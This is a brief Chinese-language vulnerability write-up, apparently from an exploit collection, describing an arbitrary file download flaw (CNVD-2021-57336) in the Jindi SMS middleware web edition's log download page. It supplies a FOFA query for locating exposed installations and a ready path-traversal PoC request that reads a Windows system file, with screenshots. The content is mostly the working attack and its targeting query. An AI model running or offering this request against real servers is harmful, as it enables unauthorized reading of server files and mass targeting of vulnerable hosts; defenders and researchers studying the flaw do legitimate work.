# 金笛 短信中间件Web版 log 后台任意文件下载漏洞 CNVD-2021-57336

## 漏洞描述

金笛 短信中间件Web版后台存在任意文件下载漏洞，攻击者通过漏洞可以获取服务器任意文件信息

## 漏洞影响

```
金笛 短信中间件Web版
```

## FOFA

```
app="金笛短信中间件(WEB版)"
```

## 漏洞复现

登录页面

![image-20220525150803211](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251508287.png)

存在漏洞的位置为 日志下载

![](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251508351.png)

验证POC

```
/log?action=view&pageIndex=1&name=../../../windows/win.ini
```

![](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251508651.png)